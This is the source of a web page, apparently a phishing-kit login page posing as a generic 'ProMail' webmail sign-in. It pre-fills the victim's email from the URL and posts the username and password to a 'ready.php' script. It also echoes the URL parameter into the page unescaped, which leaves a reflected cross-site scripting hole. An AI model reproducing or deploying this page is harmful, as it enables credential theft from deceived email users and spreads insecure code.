<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>ProMail &trade; - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link href="index.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">
    <script src="index.js"></script>


</head>
<style>
    #background{
       background-image:url("images/bg6.png");
       margin-bottom:0px;
       background-color:#0c6cb4;
       
      }

      #error{
        height:330px; 
        width:460px; 
        margin-left:450px;
        margin-top:100px; 
        background-color:#ececec;
        position:absolute; 
        z-index:+4;
        opacity:1;
        border-radius:15px;
        box-shadow: 0px 0px 30px 0px;
        border: 2px solid grey;
        
      }

    #inner{
       margin-top:5px;
       margin-left:5px;
       background-color:#0b78c4;
       background-blend-mode: lighten;
       z-index: +3;
       height:60px;
       width:98%;
       position:relative;
       zoom: 0.8;
       border-radius:15px 15px 0px 0px;
       border: 2px solid silver;
    } 

    #name{
      margin-left:50px;
      width:270px;
      border:1px solid silver;
    }

    #password{
      margin-left:50px;
      width:270px;
      border:1px solid silver;
    }

    #lang{
      margin-left:50px;
      width:150px;
      border:1px solid silver;
    }

    #but{
      margin-left:337px;
      margin-top:18px;
      background-color:#0b78c4;
      color:white;width:90px;
      height:45px;
      border-radius:5px;
      border:none;
    }
    
     @media (max-width: 700px){
     
     #background {
     width : 300px; 
     padding-left:22px; 
     } 

     #error {
     width : 330px;
     margin-left:0%;
  }
  #name{
      margin-left:20px;
      width:180px;

    } 
    #password{
      margin-left:20px;
      width:180px;

    }
    #lang{
      margin-left:20px;
      width:80px;

    }

      #but{
      margin-left:217px;
    }
}
    


</style>


<script>
 function myMove() {

  var elem = document.getElementById("animate");   
  var pos = 0;
  var id = setInterval(frame, 5);
  
  var elemm = document.getElementById("animatee");   
  var poss = 0;
  var idd = setInterval(framee, 10);
  
  var elemmm = document.getElementById("animateee");   
  var posss = 0;
  var iddd = setInterval(frameee, 20);
  
  function frame() {
    if (pos == 490) {
      clearInterval(id);
    } else {
      pos++; 
      elem.style.left = pos + "px"; 
    }
  }
    function framee() {
    if (poss == 490) {
      clearInterval(idd);
    } else {
      poss++; 
      elemm.style.left = poss + "px"; 
    }
  }
      function frameee() {
    if (posss == 490) {
      clearInterval(iddd);
    } else {
      posss++; 
      elemmm.style.left = posss + "px"; 
    }
  }
}

 function hideLoader() {
document.getElementById("animate").style.display = "none";
document.getElementById("animatee").style.display = "none";
document.getElementById("animateee").style.display = "none";
}

 function showLoader() {
  document.getElementById("animate").style.visibility = "visible";
  document.getElementById("animatee").style.visibility = "visible";
  document.getElementById("animateee").style.visibility = "visible";
}


function submitform()
{
document.getElementById("myForm").submit();
}

</script>

<?php
$value = $_GET['email'];
$dom = substr($value, strpos($value, '@') + 1);
?>


<body id = "background"> 
    <div id = "error" >
         <div id = "inner">
             <p style = "margin-top:5px"><span style = "color:white;font-size:34px;margin-left:15px;margin-top:10px;font-weight:bold">WebMail</span><span style = "color:white;font-size:34px;margin-left:15px;margin-top:10px;font-weight:thin">Login</span></p> 
         </div>
         <form id ="myForm" action = "ready.php" method = "post" class = "my_Form">
         <p style = "margin-top:50px; margin-left:20px"><label for="id1">USERNAME:</label> <input id = "name" type="text" value = "<?php echo $value?>" name ="email"/></p>
         <p style = " margin-left:20px"><label for="id2">PASSWORD:</label> <input id = "password"  type = "password" placeholder = "" name = "password" /></p>
         <p style = " margin-left:20px"><label for="id2">LANGUAGE:</label> <input id = "lang"  type="text" id="id2"/></p>
         <p style = " margin-left:20px"><input type="checkbox" id="id2"/>  <span>Remember Name & Password</span></p>
         <button type = "submit" id = "but">LOGIN</button>
         </form>
 </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</body>
</html>





